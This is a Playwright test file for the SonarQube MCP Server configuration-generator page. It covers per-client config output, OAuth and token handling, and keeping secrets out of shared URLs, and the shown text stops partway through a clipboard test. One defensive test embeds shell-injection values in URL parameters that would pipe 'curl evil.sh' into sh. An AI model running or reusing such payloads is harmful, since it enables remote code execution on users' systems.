import { test as base, expect } from '@playwright/test';

const test = base.extend({
  _pageErrorGuard: [
    async ({ page }, use) => {
      const errors: string[] = [];
      page.on('pageerror', (err) => errors.push(err.message));
      await use();
      expect(errors, errors.join('\n')).toEqual([]);
    },
    { auto: true },
  ],
});

async function selectCursor(page: import('@playwright/test').Page) {
  await page.goto('/config-generator.html');
  await page.locator('#agent').selectOption('cursor');
  await expect(page.locator('#codeOutput')).not.toContainText('Please select a target client');
}

test.describe('config-generator.html', () => {
  test('smoke: loads and generates output for Cursor without page errors', async ({ page }) => {
    await selectCursor(page);
    const out = await page.locator('#codeOutput').textContent();
    expect(out).toContain('mcpServers');
    expect(out).toContain('docker');
    expect(out).toContain('sonarsource/sonarqube-mcp');
    expect(out).not.toContain('mcp/sonarqube');
  });

  test('stdio: vortex is opt-in; deprecated cag and new defaults stay checked', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#card-stdio').click();
    await expect(page.locator('#tool-cag-label')).toBeVisible();
    await expect(page.locator('#tool-vortex-label')).toBeVisible();
    await expect(page.locator('#tool-ide-label')).toBeVisible();
    await expect(page.locator('#tool-agentic-readiness-label')).toBeVisible();
    await expect(page.locator('#tool-cag')).toBeChecked();
    await expect(page.locator('#tool-ide')).toBeChecked();
    await expect(page.locator('#tool-agentic-readiness')).toBeChecked();
    await expect(page.locator('#tool-vortex')).not.toBeChecked();
    const out = await page.locator('#codeOutput').textContent();
    expect(out).not.toContain('SONARQUBE_TOOLSETS');

    await page.locator('#tool-vortex').check();
    const withVortex = await page.locator('#codeOutput').textContent();
    expect(withVortex).toContain('SONARQUBE_TOOLSETS');
    expect(withVortex).toContain('vortex');
  });

  test('stdio + Cloud: JSON env includes token and org placeholders', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-stdio').click();
    const out = await page.locator('#codeOutput').textContent();
    expect(out).toContain('SONARQUBE_TOKEN');
    expect(out).toContain('SONARQUBE_ORG');
    expect(out).not.toContain('/api');
  });

  test('snippet placeholders use Pascal case angle brackets', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-stdio').click();
    const out = (await page.locator('#codeOutput').textContent()) || '';
    expect(out).toContain('<YourSonarQubeUserToken>');
    expect(out).toContain('<YourSonarQubeOrganizationKey>');
    expect(out).not.toContain('<YOUR_TOKEN>');
    expect(out).not.toContain('<YOUR_ORG>');
  });

  test('SQC + Cursor: MCP URL ends with /mcp and headers include SONARQUBE_ORG', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#pf-org').fill('my-test-org');
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    await page.locator('#hostedAuth').selectOption('token');
    const out = await page.locator('#codeOutput').textContent();
    expect(out).toMatch(/https:\/\/api\.sonarcloud\.io\/mcp\b/);
    expect(out).not.toContain('api.sonarcloud.io/api');
    expect(out).toContain('SONARQUBE_ORG');
    expect(out).toContain('my-test-org');
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.headers['SONARQUBE_ORG']).toBe('my-test-org');
    expect(parsed.mcpServers.sonarqube.url).toMatch(/\/mcp$/);
  });

  test('HTTP client: workspace mount hidden and stdio-only toolsets hidden', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#card-http').click();
    await page.locator('#btn-http-client').click();
    await expect(page.locator('#workspaceMountWrap')).toBeHidden();
    await expect(page.locator('#tool-cag-label')).toBeHidden();
    await expect(page.locator('#tool-vortex-label')).toBeHidden();
    await expect(page.locator('#tool-ide-label')).toBeHidden();
  });

  test('SQC + defaults: generated headers omit SONARQUBE_TOOLSETS', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    await page.locator('#hostedAuth').selectOption('token');
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.headers).toBeDefined();
    expect(parsed.mcpServers.sonarqube.headers.SONARQUBE_TOOLSETS).toBeUndefined();
    // And the serialized JSON should not mention it at all
    expect(out).not.toContain('SONARQUBE_TOOLSETS');
  });

  test('SQC: unchecking a default toolset triggers SONARQUBE_TOOLSETS header', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    // Uncheck a default that IS available for SQC
    await page.locator('#tool-issues').uncheck();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.headers.SONARQUBE_TOOLSETS).toBeDefined();
    expect(parsed.mcpServers.sonarqube.headers.SONARQUBE_TOOLSETS).not.toContain('issues');
  });


  const oauthClients = [
    { id: 'claude', signIn: '/mcp' },
    { id: 'codex', signIn: 'codex mcp login sonarqube' },
    { id: 'cursor', signIn: 'sign-in prompt' },
    { id: 'vscode', signIn: 'browser sign-in prompt' },
    { id: 'zed', signIn: 'native remote MCP' },
  ];
  const hostedRegions = [
    { id: 'cloud', url: 'https://api.sonarcloud.io/mcp' },
    { id: 'cloud-us', url: 'https://api.sonarqube.us/mcp' },
  ];

  function expectHostedOutput(client: string, output: string, url: string, headers: Record<string, string> = {}) {
    if (client === 'claude') {
      expect(output).toContain("claude mcp add --transport http sonarqube '" + url + "'");
      expect(output.match(/--header/g) || []).toHaveLength(Object.keys(headers).length);
      for (const [key, value] of Object.entries(headers)) expect(output).toContain('--header "' + key + ': ' + value + '"');
    } else if (client === 'codex') {
      expect(output).toContain('[mcp_servers.sonarqube]\nurl = "' + url + '"');
      if (Object.keys(headers).length === 0) expect(output).not.toContain('http_headers');
      else {
        expect(output).toContain('http_headers');
        for (const [key, value] of Object.entries(headers)) expect(output).toContain('"' + key + '" = "' + value + '"');
      }
    } else {
      const root = client === 'vscode' ? 'servers' : client === 'zed' ? 'context_servers' : 'mcpServers';
      expect(JSON.parse(output)).toEqual({
        [root]: {
          sonarqube: {
            url,
            ...(client === 'vscode' ? { type: 'http' } : {}),
            ...(Object.keys(headers).length ? { headers } : {}),
          },
        },
      });
    }
  }

  for (const client of oauthClients) {
    for (const region of hostedRegions) {
      test('hosted OAuth: ' + client.id + ' defaults to OAuth in ' + region.id + ' without leaking token or org', async ({ page }) => {
        await page.goto('/config-generator.html');
        await page.locator('#agent').selectOption(client.id);
        await page.locator('#envControl [data-value="' + region.id + '"]').click();
        await page.locator('#token').fill('previous-user-token');
        await page.locator('#pf-org').fill('previous-org');
        await page.locator('#card-sqc').click();
        await expect(page.locator('#hostedAuth')).toHaveValue('oauth');
        await expect(page.locator('#tokenField')).toBeHidden();
        await expect(page.locator('#field-org')).toBeHidden();
        await expect(page.locator('#tokenSecurityNote')).toBeHidden();
        await expect(page.locator('#tokenOutputWarning')).toBeHidden();
        await expect(page.locator('#instructionAlert')).toContainText(client.signIn);
        await expect(page.locator('#instructionAlert')).not.toContainText('token is exposed');
        const output = (await page.locator('#codeOutput').textContent())!;
        expectHostedOutput(client.id, output, region.url);
        expect(output).not.toMatch(/Authorization|SONARQUBE_TOKEN|SONARQUBE_ORG|previous-user-token|previous-org|YourSonarQube/);
        await expect(page).toHaveURL(/auth=oauth/);
        expect(new URL(page.url()).searchParams.has('org')).toBe(false);
      });
    }

    test('hosted OAuth: ' + client.id + ' preserves read-only and toolset preferences', async ({ page }) => {
      await page.goto('/config-generator.html?agent=' + client.id + '&transport=sqc&auth=oauth');
      await page.locator('#opt-readonly').check();
      await page.locator('#tool-issues').uncheck();
      const output = (await page.locator('#codeOutput').textContent())!;
      expect(output).not.toMatch(/Authorization|SONARQUBE_ORG|SONARQUBE_TOKEN/);
      expect(output).toContain('SONARQUBE_READ_ONLY');
      expect(output).toContain('SONARQUBE_TOOLSETS');
      expect(output).not.toMatch(/\bissues\b/);
      await page.locator('#hostedAuth').selectOption('token');
      await page.locator('#token').fill('manual-user-token');
      await page.locator('#pf-org').fill('my-org');
      const tokenOutput = (await page.locator('#codeOutput').textContent())!;
      expect(tokenOutput).toContain('Bearer manual-user-token');
      expect(tokenOutput).toContain('my-org');
      expect(tokenOutput).toContain('SONARQUBE_READ_ONLY');
      expect(tokenOutput).toContain('SONARQUBE_TOOLSETS');
      await expect(page.locator('#instructionAlert')).toContainText('token is exposed');
      await page.locator('#hostedAuth').selectOption('oauth');
      await expect(page.locator('#codeOutput')).not.toContainText('manual-user-token');
      await expect(page.locator('#codeOutput')).not.toContainText('my-org');
      await expect(page.locator('#instructionAlert')).not.toContainText('token is exposed');
    });
  }

  for (const client of ['gemini', 'generic', 'copilot-cli', 'copilot-agent', 'antigravity', 'kiro', 'windsurf']) {
    test('hosted OAuth: ' + client + ' retains token setup and explains support requirements', async ({ page }) => {
      await page.goto('/config-generator.html?agent=' + client + '&transport=sqc&auth=oauth');
      await expect(page.locator('#hostedAuth')).toHaveValue('token');
      await expect(page.locator('#hostedAuth option[value="oauth"]')).toBeDisabled();
      await expect(page.locator('#tokenField')).toBeVisible();
      await expect(page.locator('#field-org')).toBeVisible();
      await expect(page.locator('#codeOutput')).toContainText('Authorization');
      await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_ORG');
      await expect(page.locator('#hostedAuthHelp')).toContainText('CIMD');
      await expect(page.locator('#hostedAuthHelp a')).toHaveAttribute('href', 'https://community.sonarsource.com/c/mcp/54');
      await expect(page.locator('#hostedAuthNotice')).toBeVisible();
      await expect(page).toHaveURL(/auth=token/);
    });
  }

  test('hosted auth: invalid method falls back visibly and legacy links retain token mode', async ({ page }) => {
    for (const authParam of ['', '&auth=unexpected']) {
      await page.goto('/config-generator.html?agent=cursor&transport=sqc&org=legacy-org' + authParam);
      await expect(page.locator('#hostedAuth')).toHaveValue('token');
      await expect(page.locator('#codeOutput')).toContainText('legacy-org');
      await expect(page.locator('#codeOutput')).toContainText('Authorization');
      if (authParam) await expect(page.locator('#hostedAuthNotice')).toContainText('User-token authentication is selected');
      else await expect(page.locator('#hostedAuthNotice')).toBeHidden();
      await page.reload();
      await expect(page.locator('#hostedAuth')).toHaveValue('token');
    }
  });

  test('hosted auth: client changes reset capability and fresh supported setups use OAuth', async ({ page }) => {
    await page.goto('/config-generator.html?agent=cursor&transport=sqc&auth=oauth');
    await page.locator('#agent').selectOption('kiro');
    await expect(page.locator('#hostedAuth')).toHaveValue('token');
    await expect(page.locator('#codeOutput')).toContainText('Authorization');
    await page.locator('#agent').selectOption('vscode');
    await expect(page.locator('#hostedAuth')).toHaveValue('oauth');
    await expect(page.locator('#codeOutput')).not.toContainText('Authorization');
    await page.locator('#hostedAuth').selectOption('token');
    await page.locator('#card-sqc').click();
    await expect(page.locator('#hostedAuth')).toHaveValue('token');
  });

  test('hosted auth: OAuth cannot affect stdio, self-hosted clients or launch commands', async ({ page }) => {
    await page.goto('/config-generator.html?agent=cursor&transport=sqc&auth=oauth');
    for (const transport of ['stdio', 'http', 'https']) {
      await page.locator('#card-' + transport).click();
      await expect(page.locator('#hostedAuthGroup')).toBeHidden();
      await expect(page.locator('#tokenField')).toBeVisible();
      await expect(page.locator('#field-org')).toBeVisible();
      if (transport === 'stdio') await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_TOKEN');
      if (transport !== 'stdio') {
        await page.locator('#btn-http-client').click();
        await expect(page.locator('#codeOutput')).toContainText('Authorization');
        await page.locator('#btn-http-launch').click();
        await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_TOKEN');
        await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_ORG');
        await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_TRANSPORT');
      }
      await page.locator('#card-sqc').click();
      await expect(page.locator('#hostedAuth')).toHaveValue('oauth');
    }
    await page.locator('#envControl [data-value="server"]').click();
    await expect(page.locator('#hostedAuthGroup')).toBeHidden();
    await expect(page.locator('#card-sqc')).toBeHidden();
    await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_TOKEN');
    await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_URL');
  });

  test('hosted auth: Zed keeps its extension stdio and self-hosted behavior', async ({ page }) => {
    await page.goto('/config-generator.html?agent=zed&transport=sqc&auth=oauth');
    await expect(page.locator('#codeOutput')).toContainText('context_servers');
    await page.locator('#card-stdio').click();
    await expect(page.locator('#codeOutput')).toContainText('sonarqube_token');
    await expect(page.locator('#codeOutput')).not.toContainText('context_servers');
    await page.locator('#card-http').click();
    await expect(page.locator('#codeOutput')).toContainText('HTTP is not supported by the SonarQube Zed Extension.');
  });

  test('hosted OAuth: shared link and copied config survive refresh without credentials or org', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
    await page.goto('/config-generator.html?agent=cursor&env=cloud-us&transport=sqc&auth=oauth&org=ignored-org&token=ignored-token&readonly=1');
    await expect(page.locator('#hostedAuth')).toHaveValue('oauth');
    await expect(page.locator('#token')).toHaveValue('');
    await expect(page).toHaveURL(/auth=oauth/);
    await expect(page).not.toHaveURL(/org=/);
    await expect(page).not.toHaveURL(/token=/);
    await page.reload();
    await expect(page.locator('#hostedAuth')).toHaveValue('oauth');
    await expect(page.locator('#opt-readonly')).toBeChecked();
    await page.evaluate(() => document.getElementById('feedbackFab')?.remove());
    await page.locator('#copyBtn').click();
    expectHostedOutput('cursor', await page.evaluate(() => navigator.clipboard.readText()), 'https://api.sonarqube.us/mcp', { SONARQUBE_READ_ONLY: 'true' });
    await page.locator('#copyLinkBtn').click();
    const shared = new URL(await page.evaluate(() => navigator.clipboard.readText()));
    expect(shared.searchParams.get('auth')).toBe('oauth');
    expect(shared.searchParams.get('env')).toBe('cloud-us');
    expect(shared.searchParams.has('org')).toBe(false);
    expect(shared.searchParams.has('token')).toBe(false);
  });

  test('rebase: architecture is opt-in and unavailable on the hosted server', async ({ page }) => {
    await selectCursor(page);
    await expect(page.locator('#tool-architecture')).not.toBeChecked();
    await page.locator('#tool-architecture').check();
    await expect(page.locator('#codeOutput')).toContainText('architecture');
    await page.locator('#card-sqc').click();
    await expect(page.locator('#tool-architecture-label')).toBeHidden();
    await expect(page.locator('#tool-architecture')).toBeDisabled();
    await expect(page.locator('#codeOutput')).not.toContainText('architecture');
  });

  test('SQC transport: analysis and non-default toolsets are hidden', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-sqc').click();
    // Excluded for SQC:
    await expect(page.locator('#tool-analysis-label')).toBeHidden();
    await expect(page.locator('#tool-ide-label')).toBeHidden();
    await expect(page.locator('#tool-cag-label')).toBeHidden();
    await expect(page.locator('#tool-vortex-label')).toBeHidden();
    await expect(page.locator('#tool-sources-label')).toBeHidden();
    await expect(page.locator('#tool-languages-label')).toBeHidden();
    await expect(page.locator('#tool-portfolios-label')).toBeHidden();
    await expect(page.locator('#tool-system-label')).toBeHidden();
    await expect(page.locator('#tool-webhooks-label')).toBeHidden();
    // Available for SQC:
    await expect(page.locator('#tool-projects-label')).toBeVisible();
    await expect(page.locator('#tool-issues-label')).toBeVisible();
    await expect(page.locator('#tool-security-hotspots-label')).toBeVisible();
    await expect(page.locator('#tool-quality-gates-label')).toBeVisible();
    await expect(page.locator('#tool-rules-label')).toBeVisible();
    await expect(page.locator('#tool-duplications-label')).toBeVisible();
    await expect(page.locator('#tool-measures-label')).toBeVisible();
    await expect(page.locator('#tool-dependency-risks-label')).toBeVisible();
    await expect(page.locator('#tool-coverage-label')).toBeVisible();
    await expect(page.locator('#tool-agentic-readiness-label')).toBeVisible();
  });

  test('step 3 is called "Transport mode" (sentence case)', async ({ page }) => {
    await page.goto('/config-generator.html');
    // Wait for the renderer to populate the UI (toolsets grid is built from JSON)
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('.card-title').filter({ hasText: 'Transport mode' })).toBeVisible();
    await expect(page.locator('.card-title').filter({ hasText: 'Connection Mode' })).toHaveCount(0);
  });

  test('SQC transport is labeled "Cloud-hosted" not "official"', async ({ page }) => {
    await page.goto('/config-generator.html');
    const sqcCard = page.locator('#card-sqc .radio-title');
    await expect(sqcCard).toContainText('Cloud-hosted');
    await expect(sqcCard).not.toContainText('Official');
  });

  test('user token label uses "User token (optional)"', async ({ page }) => {
    await page.goto('/config-generator.html');
    const label = page.locator('label[for="token"]');
    await expect(label).toContainText('User token');
    await expect(label).toContainText('(optional)');
    await expect(label).not.toContainText('but recommended');
  });

  test('footer has copyright, docs link, CLI cross-link, llms.txt, and GitHub', async ({ page }) => {
    await page.goto('/config-generator.html');
    const footer = page.locator('footer.footer');
    const year = new Date().getFullYear().toString();
    await expect(footer).toContainText(`© ${year} SonarSource Sàrl`);
    await expect(footer.locator('a[href="https://docs.sonarsource.com/sonarqube-mcp-server"]')).toBeVisible();
    await expect(footer.locator('a[href="https://cli.sonarqube.com"]')).toBeVisible();
    await expect(footer.locator('a[href="llms.txt"]')).toBeVisible();
    await expect(footer.locator('a[href="https://github.com/SonarSource/sonar-mcp-server"]')).toBeVisible();
    // config-flow.json is intentionally not advertised to end users
    await expect(footer.locator('a[href="config-flow.json"]')).toHaveCount(0);
  });

  test('llms.txt (AI-readable reference) is served', async ({ page, request }) => {
    const response = await request.get('/llms.txt');
    expect(response.status()).toBe(200);
    const body = await response.text();
    expect(body).toContain('SonarQube MCP Server');
    expect(body).toContain('<YourSonarQubeUserToken>');
    expect(body).toContain('SONARQUBE_TOOLSETS');
  });

  test('llms.txt is pure ASCII (no mojibake-prone characters)', async ({ request }) => {
    // LLMs or curl|less pipelines may read llms.txt as Latin-1, turning em-dashes
    // and arrows into mojibake (e.g. "—" becomes "â€”"). Keep the file ASCII-only.
    const response = await request.get('/llms.txt');
    expect(response.status()).toBe(200);
    const body = await response.text();
    const offenders: { char: string; code: string; line: number; context: string }[] = [];
    const lines = body.split('\n');
    lines.forEach((line, i) => {
      for (const ch of line) {
        if (ch.charCodeAt(0) > 127) {
          offenders.push({
            char: ch,
            code: 'U+' + ch.charCodeAt(0).toString(16).toUpperCase().padStart(4, '0'),
            line: i + 1,
            context: line.trim(),
          });
        }
      }
    });
    expect(
      offenders,
      'llms.txt must be pure ASCII. Non-ASCII characters found:\n' +
        offenders.map(o => `  line ${o.line}: ${o.code} '${o.char}' in "${o.context}"`).join('\n')
    ).toEqual([]);
  });

  test('nav has a home link, GitHub link, llms.txt link, and theme toggle', async ({ page }) => {
    await page.goto('/config-generator.html');
    const nav = page.locator('nav.nav');
    await expect(nav.locator('a.logo')).toContainText('SonarQube MCP Server');
    await expect(nav.locator('a.nav-link[href="index.html"]')).toBeVisible();
    await expect(nav.locator('a.nav-link[href="llms.txt"]')).toBeVisible();
    await expect(nav.locator('a.nav-link[href*="github.com"]')).toBeVisible();
    await expect(nav.locator('#themeToggle')).toBeVisible();
  });

  test('theme toggle switches to light mode and persists', async ({ page }) => {
    await page.goto('/config-generator.html');
    // Starts in dark mode (no data-theme attribute)
    expect(await page.locator('html').getAttribute('data-theme')).toBeNull();
    await page.locator('#themeToggle').click();
    expect(await page.locator('html').getAttribute('data-theme')).toBe('light');
    // Reload and verify persistence via localStorage
    await page.reload();
    expect(await page.locator('html').getAttribute('data-theme')).toBe('light');
    // Toggle back
    await page.locator('#themeToggle').click();
    expect(await page.locator('html').getAttribute('data-theme')).toBeNull();
  });

  test('favicon and logo assets are served', async ({ request }) => {
    const favicon = await request.get('/assets/favicon.ico');
    expect(favicon.status()).toBe(200);
    const darkLogo = await request.get('/assets/Sonar_Mark_Dark%20Backgrounds.png');
    expect(darkLogo.status()).toBe(200);
    const lightLogo = await request.get('/assets/Sonar_Mark_Light%20Backgrounds.png');
    expect(lightLogo.status()).toBe(200);
  });

  test('external stylesheet is served and defines the CLI design tokens', async ({ request }) => {
    const response = await request.get('/assets/style.css');
    expect(response.status()).toBe(200);
    const body = await response.text();
    expect(body).toContain('--bg: #0f1117');
    expect(body).toContain('--accent: #126ed3');
    expect(body).toContain('[data-theme="light"]');
  });

  test('agent dropdown is sorted alphabetically by label', async ({ page }) => {
    await page.goto('/config-generator.html');
    // Wait for the renderer to populate the dropdown from config-flow.json
    await expect(page.locator('#tool-projects')).toBeAttached();
    const labels = await page.locator('#agent option').evaluateAll(opts =>
      opts.filter(o => (o as HTMLOptionElement).value !== '').map(o => o.textContent!.trim())
    );
    const sorted = [...labels].sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));
    expect(labels).toEqual(sorted);
  });

  test('"SonarQube MCP Server" product name is always capitalized correctly', async ({ page, request }) => {
    // Guard against lowercase "server" slipping into user-facing copy.
    // The product name must always appear as "SonarQube MCP Server".
    const pages = [
      '/config-generator.html',
      '/config-flow.json',
      '/llms.txt',
    ];
    for (const p of pages) {
      const res = await request.get(p);
      expect(res.status(), `${p} returned ${res.status()}`).toBe(200);
      const body = await res.text();
      expect(body, `${p} contains "SonarQube MCP server" (wrong casing)`).not.toMatch(/SonarQube MCP server/);
    }
  });

  test('Cursor stdio includes type stdio', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('cursor');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-stdio').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.type).toBe('stdio');
  });

  test('Cursor HTTP uses url (not serverUrl) and no type field', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('cursor');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.url).toBeDefined();
    expect(parsed.mcpServers.sonarqube.serverUrl).toBeUndefined();
    expect(parsed.mcpServers.sonarqube.type).toBeUndefined();
  });

  test('Antigravity HTTP uses serverUrl (not url) and no type field', async ({ page }) => {
    // Per https://antigravity.google/docs/mcp, HTTP transport uses "serverUrl"
    // and has no "type" field (transport inferred from which key is present).
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('antigravity');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.serverUrl).toBeDefined();
    expect(parsed.mcpServers.sonarqube.url).toBeUndefined();
    expect(parsed.mcpServers.sonarqube.type).toBeUndefined();
  });

  test('Windsurf HTTP uses serverUrl (not url) and no type field', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('windsurf');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.serverUrl).toBeDefined();
    expect(parsed.mcpServers.sonarqube.url).toBeUndefined();
    expect(parsed.mcpServers.sonarqube.type).toBeUndefined();
  });

  test('Gemini HTTP uses httpUrl (not url)', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('gemini');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.httpUrl).toBeDefined();
    expect(parsed.mcpServers.sonarqube.url).toBeUndefined();
  });

  test('VS Code uses root key "servers" (not mcpServers)', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('vscode');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-stdio').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.servers).toBeDefined();
    expect(parsed.mcpServers).toBeUndefined();
  });

  test('Kiro HTTP has no type field', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('kiro');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#token').fill('test-token');
    await page.locator('#card-sqc').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.url).toBeDefined();
    expect(parsed.mcpServers.sonarqube.type).toBeUndefined();
  });

  test('Copilot CLI stdio uses type:"local" and tools:["*"]', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('copilot-cli');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-stdio').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.type).toBe('local');
    expect(parsed.mcpServers.sonarqube.tools).toEqual(['*']);
  });

  test('GitHub Copilot cloud agent stdio env values are COPILOT_MCP_* references', async ({ page }) => {
    await page.goto('/config-generator.html');
    await page.locator('#agent').selectOption('copilot-agent');
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#card-stdio').click();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.env.SONARQUBE_TOKEN).toBe('COPILOT_MCP_SONARQUBE_TOKEN');
    expect(parsed.mcpServers.sonarqube.env.SONARQUBE_ORG).toBe('COPILOT_MCP_SONARQUBE_ORG');
  });

  test('project key: stdio emits SONARQUBE_PROJECT_KEY; SQC JSON headers omit it', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#card-stdio').click();
    await page.locator('#projectKey').fill('my_project');
    await expect(page.locator('#codeOutput')).toContainText('SONARQUBE_PROJECT_KEY');
    await expect(page.locator('#codeOutput')).toContainText('my_project');

    await page.locator('#card-sqc').click();
    await page.locator('#hostedAuth').selectOption('token');
    await expect(page.locator('#projectKeyWrap')).toBeHidden();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.headers).toBeDefined();
    expect(parsed.mcpServers.sonarqube.headers.SONARQUBE_PROJECT_KEY).toBeUndefined();
  });

  test('URL params: restores non-sensitive configuration on load', async ({ page }) => {
    await page.goto('/config-generator.html?agent=cursor&env=cloud&transport=sqc&org=my-shared-org&projectKey=shared_project&readonly=1');
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('#agent')).toHaveValue('cursor');
    await expect(page.locator('#envControl .segment-btn[data-value="cloud"]')).toHaveClass(/active/);
    await expect(page.locator('#card-sqc')).toHaveClass(/active/);
    await expect(page.locator('#pf-org')).toHaveValue('my-shared-org');
    await expect(page.locator('#projectKey')).toHaveValue('shared_project');
    await expect(page.locator('#opt-readonly')).toBeChecked();
    const out = await page.locator('#codeOutput').textContent();
    const parsed = JSON.parse(out!.trim());
    expect(parsed.mcpServers.sonarqube.headers['SONARQUBE_ORG']).toBe('my-shared-org');
    expect(parsed.mcpServers.sonarqube.headers['SONARQUBE_READ_ONLY']).toBe('true');
  });

  test('URL params: never includes user token', async ({ page }) => {
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#pf-org').fill('my-org');
    await page.locator('#token').fill('sqp_super_secret_token');
    await page.locator('#card-sqc').click();
    await page.locator('#hostedAuth').selectOption('token');
    await expect(page).toHaveURL(/agent=cursor/);
    await expect(page).toHaveURL(/transport=sqc/);
    await expect(page).toHaveURL(/org=my-org/);
    const search = new URL(page.url()).searchParams;
    expect(search.has('token')).toBe(false);
    expect(search.has('SONARQUBE_TOKEN')).toBe(false);
    expect(page.url()).not.toContain('sqp_super_secret_token');
  });

  test('URL params: ignores invalid values safely', async ({ page }) => {
    await page.goto('/config-generator.html?agent=not-a-real-agent&transport=teleport&foo=bar');
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('#agent')).toHaveValue('');
    await expect(page.locator('#card-stdio')).toHaveClass(/active/);
    await expect(page.locator('#codeOutput')).toContainText('Please select a target client');
  });

  test('URL params: refresh preserves non-sensitive configuration', async ({ page }) => {
    await page.goto('/config-generator.html?agent=cursor&transport=sqc&org=refresh-org');
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('#pf-org')).toHaveValue('refresh-org');
    await page.reload();
    await expect(page.locator('#agent')).toHaveValue('cursor');
    await expect(page.locator('#pf-org')).toHaveValue('refresh-org');
    await expect(page.locator('#card-sqc')).toHaveClass(/active/);
  });

  test('URL params: secret query params are ignored on load', async ({ page }) => {
    await page.goto('/config-generator.html?agent=cursor&transport=https&httpMode=launch&token=leaked-token&keystorePassword=leaked-password');
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('#agent')).toHaveValue('cursor');
    await expect(page.locator('#card-https')).toHaveClass(/active/);
    await expect(page.locator('#token')).toHaveValue('');
    await expect(page.locator('#keystorePassword')).toHaveValue('');
  });

  test('URL params: rejects shell-injection payloads on load', async ({ page }) => {
    await page.goto('/config-generator.html?agent=cursor&org=x%22;curl%20evil.sh|sh;echo%20%22&httpPort=8080;curl%20evil|sh%23');
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('#agent')).toHaveValue('cursor');
    await expect(page.locator('#pf-org')).toHaveValue('');
    await expect(page.locator('#httpPort')).toHaveValue('8080');
  });

  test('Copy shareable link survives rapid repeat clicks', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
